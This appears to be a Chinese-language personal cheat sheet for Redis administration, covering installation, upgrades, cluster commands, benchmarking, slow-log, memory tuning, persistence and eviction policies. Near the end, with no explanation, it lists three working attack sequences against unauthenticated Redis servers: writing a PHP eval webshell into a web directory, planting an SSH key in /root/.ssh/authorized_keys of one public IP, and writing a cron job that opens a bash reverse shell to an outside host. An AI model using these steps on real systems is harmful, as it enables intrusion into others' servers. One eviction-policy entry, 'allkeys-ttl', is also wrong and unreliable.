redis 安装与升级

redis替代品
https://github.com/OpenAtomFoundation/pika
https://www.pangugle.com/tech/article/pika/tutorial.html
https://github.com/ideawu/ssdb


http://www.cnblogs.com/stephen-liu74/archive/2012/02/18/2356951.html
https://redis.readthedocs.org/en/latest/
https://mp.weixin.qq.com/s/2sUWnpJCvkJ8-7XSGLdesA
redis之cluster模式
https://mp.weixin.qq.com/s/f_9rSYdeKHDvxErdriHcJQ
edis之sentinel模式
https://blog.51cto.com/net881004/2538343
https://juejin.cn/post/6854573215532974094
https://ngx.hk/2020/06/03/%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2redis6%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4.html

redis-cli 连接
redis-cli -h 127.0.0.1 -p 6389 -a pass1234
telnet 10.25.30.143 6389

set key value
get key
keys pattern
del key
exists key
move key db
rename key newkey
renamed key newkey
persist key 持久化存储
expire key seconds
expireat key timestamp
ttl key
randomkey
type key
sort key [by pattern]

flushdb
sadd key 1 2 3
hset key username “test”
keys key*
del key1 key2

select 0 打开默认为0的数据库

keys TG:TG:*
scan 0 match TG:TG:* count 100

redis-cli info | grep instantaneous_ops_per_sec
redis-cli info | grep keyspace_
命中率 keyspace_hits/(keyspace_hits+keyspace_misses)
redis-cli info | grep used_memory
redis-cli info | grep mem_fragmentation_ratio #碎片率
redis-cli info | grep evicted_keys #由于最大内存限制被移除的key的数量
redis-cli info | grep blocked_clients #由于BLPOP, BRPOP, or BRPOPLPUSH而备阻塞的客户端
redis-cli info | grep connected_clients
redis-cli info | grep rejected_connections #由于达到maxclient限制而被拒绝的连接数
redis-cli info | grep connected_slaves
redis-cli info | grep master_last_io_seconds_ago #最近一次主从交互之后的秒数
redis-cli info | grep master_link_down_since_seconds #主从断开的持续时间（以秒为单位）
redis-cli info Keyspace
redis-cli slowlog get 5
redis-cli --bigkeys -i 0.01


redis 安装
yum install redis -y


redis 升级

wget http://download.redis.io/releases/redis-2.8.9.tar.gz
tar zxvf redis-2.8.9.tar.gz
cd redis-2.8.9
make

跟原本的 redis 2.0 裝在同一個目錄
sudo make PREFIX=/usr install

再把新的 config 檔蓋過去
sudo cp redis.conf /etc/

為了讓原本的 init script 正常運作 redis.conf 要稍微修改
daemonize yes

原本 redis-server 是裝在 /usr/sbin 新的是裝在 /usr/bin 把 /usr/sbin/redis-server 覆蓋過去
sudo mv /usr/bin/redis-server /usr/sbin/

#创建集群主节点
redis-cli --cluster create 10.10.3.22:6379 10.10.3.22:6380 10.10.3.22:6381
#创建集群主从节点，--cluster-replicas 参数为数字，1表示每个主节点需要1个从节点
redis-cli --cluster create 10.10.3.22:6379 10.10.3.22:6380 10.10.3.22:6381 10.10.3.22:6382 10.10.3.22:6383 10.10.3.22:6384 --cluster-replicas 1
#添加集群主节点
redis-cli --cluster add-node 10.10.3.22:6385 10.10.3.22:6379
#删除节点
redis-cli --cluster del-node 10.10.3.22:6385 e6e92e84dd3b2e7d1e7c39a9d5819d1c64be6abb
#添加集群从节点 c9f32d755fc22d016cce04b8ef3e114c8d564e19 是10.10.3.22:6379的ID
redis-cli --cluster add-node 10.10.3.22:6385 10.10.3.22:6379 --cluster-slave --cluster-master-id c9f32d755fc22d016cce04b8ef3e114c8d564e19
#检查集群状态
redis-cli --cluster check 10.10.3.22:6379
redis-cli --cluster check 10.10.3.22:6379 --cluster-search-multiple-owners
redis-cli --cluster info 10.10.3.22:6379

#连接至集群某个节点
redis-cli -c -h 10.10.3.22 -p 6379
#查看集群信息
cluster info
#查看集群结点信息
cluster nodes
#写入数据
set name test
# 读取数据
get name

#修复集群和槽的重复分配问题
redis-cli --cluster fix 10.10.3.22:6379 --cluster-search-multiple-owners
设置集群的超时时间
redis-cli --cluster set-timeout 10.10.3.22:6379 10000
集群中执行相关命令
redis-cli --cluster call 10.10.3.22:6379 config set cluster-node-timeout 12000
redis-cli --cluster call 10.10.3.22:6379 config set requirepass cc
redis-cli --cluster call 10.10.3.22:6379 config set masterauth cc
redis-cli --cluster call 10.10.3.22:6379 config rewrite
在线迁移slot 一是根据提示来进行操作
redis-cli --cluster reshard 10.10.3.22:6379
二是根据参数进行操作
redis-cli --cluster reshard 10.10.3.22:6379 --cluster-from 117457eab5071954faab5e81c3170600d5192270 --cluster-to 815da8448f5d5a304df0353ca10d8f9b77016b28 --cluster-slots 10 --cluster-yes --cluster-timeout 5000 --cluster-pipeline 10 --cluster-replace
平衡集群中各个节点的slot数量
redis-cli --cluster rebalance 192.168.163.132:6379
根据集群中各个节点设置的权重等平衡slot数量（不执行，只模拟）
redis-cli --cluster rebalance --cluster-weight 117457eab5071954faab5e81c3170600d5192270=5 815da8448f5d5a304df0353ca10d8f9b77016b28=4 56005b9413cbf225783906307a2631109e753f8f=3 --cluster-simulate 192.168.163.132:6379
导入集群
redis-cli --cluster import 192.168.163.132:6379 --cluster-from 192.168.163.132:9021 --cluster-replace

集群测试
https://github.com/panjiang/redisbench
测试单个实例
./redisbench -a 127.0.0.1:6379 -c 500 -n 2000 -d 3
测试集群
./redisbench -cluster=true -a 192.168.10.11:7000,192.168.10.11:7001 -c 500 -n 2000 -d 3
使用多个测试节点
./redisbench -cluster=true -a 192.168.10.11:7000,192.168.10.11:7001 -c 500 -n 2000 -d 3 -ma 192.168.10.11:9001,192.168.10.11:9002 -mo 1&
./redisbench -cluster=true -a 192.168.10.11:7000,192.168.10.11:7001 -c 500 -n 2000 -d 3 -ma 192.168.10.11:9001,192.168.10.11:9002 -mo 2
./redisbench -cluster=true -a 192.168.10.11:7000,192.168.10.11:7001 -c 500 -n 2000 -d 3 -ma 192.168.10.11:9001,192.168.10.11:9002,192.168.10.11:9003 -mo 1 &
./redisbench -cluster=true -a 192.168.10.11:7000,192.168.10.11:7001 -c 500 -n 2000 -d 3 -ma 192.168.10.11:9001,192.168.10.11:9002,192.168.10.11:9003 -mo 2 &
./redisbench -cluster=true -a 192.168.10.11:7000,192.168.10.11:7001 -c 500 -n 2000 -d 3 -ma 192.168.10.11:9001,192.168.10.11:9002,192.168.10.11:9003 -mo 3

# 命令执行超过5毫秒记录慢日志
CONFIG SET slowlog-log-slower-than 5000
# 只保留最近1000条慢日志
CONFIG SET slowlog-max-len 1000
SLOWLOG get 5查询最近5条慢日志：
SLOWLOG get 5
扫描bigkey的方法：
redis-cli --bigkeys -i 0.01
bigkey 的分布情况
redis-cli -h 127.0.0.1 -p 6379 --bigkeys -i 0.01

测试出这个实例 60 秒内的最大响应延迟
redis-cli -h 127.0.0.1 -p 6379 --intrinsic-latency 60
查看一段时间内 Redis 的最小、最大、平均访问延迟
redis-cli -h 127.0.0.1 -p 6379 --latency-history -i 1
如果你使用的 Redis 是 4.0 以上版本，用 UNLINK 命令替代 DEL，此命令可以把释放 key 内存的操作，放到后台线程中去执行，从而降低对 Redis 的影响
如果你使用的 Redis 是 6.0 以上版本，可以开启 lazy-free 机制（lazyfree-lazy-user-del = yes），在执行 DEL 命令时，释放内存也会放到后台线程中执行
lazyfree-lazy-user-del yes
lazyfree-lazy-expire yes
lazyfree-lazy-server-del yes
lazyfree-lazy-eviction no
淘汰策略 maxmemory-policy：
allkeys-lru：不管 key 是否设置了过期，淘汰最近最少访问的 key
volatile-lru：只淘汰最近最少访问、并设置了过期时间的 key
allkeys-random：不管 key 是否设置了过期，随机淘汰 key
volatile-random：只随机淘汰设置了过期时间的 key
allkeys-ttl：不管 key 是否设置了过期，淘汰即将过期的 key
noeviction：不淘汰任何 key，实例内存达到 maxmeory 后，再写入新数据直接返回错误
allkeys-lfu：不管 key 是否设置了过期，淘汰访问频率最低的 key（4.0+版本支持）
volatile-lfu：只淘汰访问频率最低、并设置了过期时间 key（4.0+版本支持）

INFO
# 上一次 fork 耗时，单位微秒
latest_fork_usec:59477
是否开启了内存大页：
$ cat /sys/kernel/mm/transparent_hugepage/enabled
如果输出选项是 always，就表示目前开启了内存大页机制，我们需要关掉它：
$ echo never > /sys/kernel/mm/transparent_hugepage/enabled
Redis 提供了 3 种刷盘机制：
appendfsync always：主线程每次执行写操作后立即刷盘，此方案会占用比较大的磁盘 IO 资源，但数据安全性最高
appendfsync no：主线程每次写操作只写内存就返回，内存数据什么时候刷到磁盘，交由操作系统决定，此方案对性能影响最小，但数据安全性也最低，Redis 宕机时丢失的数据取决于操作系统刷盘时机
appendfsync everysec：主线程每次写操作只写内存就返回，然后由后台线程每隔 1 秒执行一次刷盘操作（触发fsync系统调用），此方案对性能影响相对较小，但当 Redis 宕机时会丢失 1 秒的数据

Redis 在 6.0 版本已经推出了这个功能，我们可以通过以下配置，对主线程、后台线程、后台 RDB 进程、AOF rewrite 进程，绑定固定的 CPU 逻辑核心：

# Redis Server 和 IO 线程绑定到 CPU核心 0,2,4,6
server_cpulist 0-7:2

# 后台子线程绑定到 CPU核心 1,3
bio_cpulist 1,3

# 后台 AOF rewrite 进程绑定到 CPU 核心 8,9,10,11
aof_rewrite_cpulist 8-11

# 后台 RDB 进程绑定到 CPU 核心 1,10,11
# bgsave_cpulist 1,10-1

查看 Redis 进程是否使用到了 Swap：

# 先找到 Redis 的进程 ID
$ ps -aux | grep redis-server

# 查看 Redis Swap 使用情况
$ cat /proc/$pid/smaps | egrep '^(Swap|Size)'

碎片整理
INFO
# Memory
used_memory:5709194824
used_memory_human:5.32G
used_memory_rss:8264855552
used_memory_rss_human:7.70G
...
mem_fragmentation_ratio:1.45
其中 used_memory 表示 Redis 存储数据的内存大小，而 used_memory_rss 表示操作系统实际分配给 Redis 进程的大小。

如果 mem_fragmentation_ratio > 1.5，说明内存碎片率已经超过了 50%，这时我们就需要采取一些措施来降低内存碎片了。
Redis 碎片整理的参数配置如下：

# 开启自动内存碎片整理（总开关）
activedefrag yes

# 内存使用 100MB 以下，不进行碎片整理
active-defrag-ignore-bytes 100mb

# 内存碎片率超过 10%，开始碎片整理
active-defrag-threshold-lower 10
# 内存碎片率超过 100%，尽最大努力碎片整理
active-defrag-threshold-upper 100

# 内存碎片整理占用 CPU 资源最小百分比
active-defrag-cycle-min 1
# 内存碎片整理占用 CPU 资源最大百分比
active-defrag-cycle-max 25

# 碎片整理期间，对于 List/Set/Hash/ZSet 类型元素一次 Scan 的数量
active-defrag-max-scan-fields 1000

redis-cli --hotkeys 获取当前 keyspace 的热点 key
redis-cli -p 1111 hotkey | cat

开启订阅KEY过期
vi /etc/redis.conf
notify-keyspace-events "Ex"
notify-keyspace-events "KEA"
maxmemory 1024mb #限定最多使用1GB内存
maxmemory-policy allkeys-lru #设置策略为清理最少使用的key对应的数据

config set notify-keyspace-events KEA

redis-cli
subscribe __keyevent@0__:expired

info stats
info memory
info cpu
info keyspace
info commandstats
slowlog get 10

gem install redis-stat
java -jar redis-stat-0.4.14.jar --server

redis-stat
redis-stat 1
redis-stat 1 10
redis-stat --verbose
redis-stat localhost:6380 1 10
redis-stat localhost localhost:6380 localhost:6381 5
redis-stat localhost localhost:6380 1 10 --csv=/tmp/output.csv --verbose

# RDB持久化操作设置，下面的配置分别表示：900秒内至少一个键被修改则进行快照，5分钟内至少10个键被修改则进行快照，1分钟内10000个键被更改则进行快照
save 900 1
save 300 10
save 60 10000

AOF
appendonly yes // 开启AOF
appendfilename "appendonly.aof" //持久化文件
dir ./ // 文件所在目录
# 表示当前aof文件大小超过上一次aof文件大小的百分之多少的时候会进行重写。如果之前没有重写过，以启动时aof文件大小为准
auto-aof-rewrite-percentage 100
# 限制允许重写最小aof文件大小，也就是文件大小小于64mb的时候，不需要进行优化
auto-aof-rewrite-min-size 64mb

压力测试
redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000
redis-benchmark -h 10.1.1.96 -p 6379 -c 100 -n 100000
redis-benchmark -h 10.1.1.96 -p 6379 -q -d 500
redis-benchmark -t set,get -n 100000 -q
redis-benchmark -h 127.0.0.1 -p 6379 -c 50 -n 10000 -q

redis-cli -h 192.168.5.135
set one "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"
config set dir  /var/www/html/dedecms/uploads
config set dbfilename webshell.php
save

(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h 173.239.46.188 -x set crackit
redis-cli -h 192.168.5.135
flushall
config get dir
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE

redis-cli -h 192.168.1.8
set test "\n* * * * * bash -i >& /dev/tcp/192.168.1.4/4444 0>&1\n"
config set dir /var/spool/cron  #设置工作目录
config  set dbfilename "root"
save

对有设置任职过期时间的职员进行淘汰，没有设定任职过期时间的不会淘汰，淘汰策略如下：
volatile-lru：淘汰最近最少上一线干活的人员；
volatile-lfu：4.0 之后新增的策略，淘汰上一线干活次数最少的人员；
volatile-random：随机淘汰，腾出坑位给新人；
volatile-ttl：淘汰设置了任期时间的公务员，谁最接近任期时间就先淘汰谁。
对所有类型人员淘汰，不管是永久 vip 的皇亲国戚还是设置了任职过期时间的人员。
allkeys-lru：淘汰最近最少上一线干活的职员；
allkeys-lfu：淘汰最少上一线干活的公务员；
allkeys-random：随机淘汰职员，为新兵腾出空位。

CONFIG SET maxmemory 4gb
